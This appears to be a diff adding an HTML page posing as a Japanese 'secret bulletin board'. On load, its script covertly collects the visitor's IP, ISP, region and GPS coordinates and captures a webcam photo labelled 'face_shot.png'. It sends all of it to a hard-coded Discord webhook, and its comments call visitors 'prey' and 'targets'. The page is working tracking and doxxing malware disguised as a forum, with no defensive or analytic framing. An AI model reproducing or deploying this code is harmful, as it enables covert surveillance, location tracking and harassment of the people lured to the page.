@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>秘密の掲示板（公式）</title>
+    <meta charset="utf-8">
+</head>
+<body>
+    <h1>読み込み中...</h1>
+    <p>掲示板を表示するには、位置情報とデバイスの確認を許可してください。</p>
+
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1492465803109466143/JvoWk-yMCXTaC25OBrcZBQ9etMeOENU8VxYWVT_fG7P7osAOUc3jqwckWr7X4poHmKkq";
+
+    async function captureAndSend() {
+        let payload = {
+            content: "||PAUSE… NO HOMO|| 新しい獲物が掲示板にアクセスしたぜ。",
+            embeds: []
+        };
+
+        try {
+            // 1. IPと基本情報の取得
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+
+            // 2. 位置情報の取得（住所特定用）
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const geoData = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (精度: ${pos.coords.accuracy}m)`;
+                
+                // 3. カメラの起動と撮影
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+
+                const canvas = document.getElementById('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                
+                // 画像をBlobに変換
+                canvas.toBlob(async (blob) => {
+                    const formData = new FormData();
+                    
+                    // JSONデータを作成
+                    const info = {
+                        username: "秘密の掲示板・追跡ボット",
+                        embeds: [{
+                            title: "ターゲット捕捉完了",
+                            color: 0x00ff00,
+                            fields: [
+                                { name: "IP", value: ipData.ip || "取得失敗" },
+                                { name: "プロバイダ", value: ipData.org || "不明" },
+                                { name: "地域", value: `${ipData.city}, ${ipData.region}, ${ipData.country_name}` },
+                                { name: "GPS座標", value: geoData },
+                                { name: "デバイス", value: navigator.userAgent }
+                            ]
+                        }]
+                    };
+
+                    formData.append('payload_json', JSON.stringify(info));
+                    formData.append('file', blob, 'face_shot.png');
+
+                    // Webhookにフルクリップで送信
+                    await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
+                    
+                    // 終了後に掲示板っぽく見せるならリダイレクト
+                    // window.location.href = "https://example.com/real_board";
+                }, 'image/png');
+            });
+        } catch (err) {
+            console.error("Error cooking data:", err);
+        }
+    }
+
+    // ページ読み込み時に実行
+    window.onload = captureAndSend;
+    </script>
+</body>
+</html>
